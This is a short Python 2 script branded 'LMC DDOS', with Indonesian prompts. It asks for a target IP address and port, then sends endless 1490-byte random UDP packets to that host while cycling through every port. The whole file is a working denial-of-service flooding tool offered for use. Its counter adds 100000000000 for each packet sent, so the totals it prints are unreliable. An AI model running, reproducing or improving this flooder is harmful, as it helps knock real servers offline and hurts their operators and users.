import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet LMC DDOS")
print
print """         .##.......##.....##..######.
         .##.......###...###.##....##
         .##.......####.####.##......
         .##.......##.###.##.##......
         .##.......##.....##.##......
         .##.......##.....##.##....##
         .########.##.....##..######."""
print "<===============================>"         
print "||========>DDOS L-M-C<=========||"
print "<===============================>"
print "CREATED=MR.A'R"
print "thanks to=MR.ynz-LK24-ALL MEMBER LMC"
print
ip = raw_input("MASUKAN IP TAGET ===> ")
port = input("Port       ===> ")

os.system("clear")
os.system("figlet Wait")
print "sedang proses ....."
time.sleep(10)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 100000000000
     port = port + 1
     print "mmengirim %s packet ke %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1